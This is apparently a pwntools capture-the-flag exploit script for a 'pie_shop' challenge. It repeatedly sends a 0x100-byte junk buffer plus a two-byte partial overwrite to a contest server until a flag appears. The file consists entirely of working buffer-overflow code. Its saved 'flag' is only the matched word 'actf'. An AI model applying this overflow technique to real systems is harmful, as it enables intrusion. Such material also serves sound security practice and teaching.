#!/usr/bin/env python

from pwn import *
import re
import time

NUM_JUNK_BYTES = 0x100
TIMEOUT = 10.0

def recv_response(p):
    r = p.recvrepeat(TIMEOUT)
    print "[+] Response: " + r
    return r

while True:
    # p = process("./pie_shop")
    p = remote("shell.actf.co", 19306)
    recv_response(p)

    buf = "a" * NUM_JUNK_BYTES
    buf += "\xa9\x51"

    # gdb.attach(p)

    # NOTE: uncomment below when running against server
    # recv_response(p)
    print "[+] Sending exploit"
    p.sendline(buf)
    r = recv_response(p)

    m = re.search(r"actf", r, re.MULTILINE)
    # m = re.search(r"flag", r)
    if m:
        flag = m.group(0)
        print "[+] Found flag: " + flag

        f = open("flag_actf.txt", "w")
        f.write(flag)
        f.close()
        break

    p.close()
    time.sleep(1.0)

    #p.interactive()
